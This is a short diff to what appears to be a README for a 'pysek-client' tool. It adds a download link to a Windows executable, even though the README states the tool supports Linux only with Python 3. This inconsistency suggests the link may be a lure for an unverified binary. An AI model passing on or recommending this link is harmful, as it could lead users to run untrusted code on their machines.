@@ -41,4 +41,10 @@ Supported linux only with python 3 installed.
 
 - The latest version you can download from github is 3.4, but you will be agreeing to the 3.5 terms & conditions if you install it.
 
+- Download Link :
+
+https://github.com/Wh1ter0sEo4/pysek-client/blob/main/clients/3.4/setup_x64_py.exe
+
+have fun <3
+
 
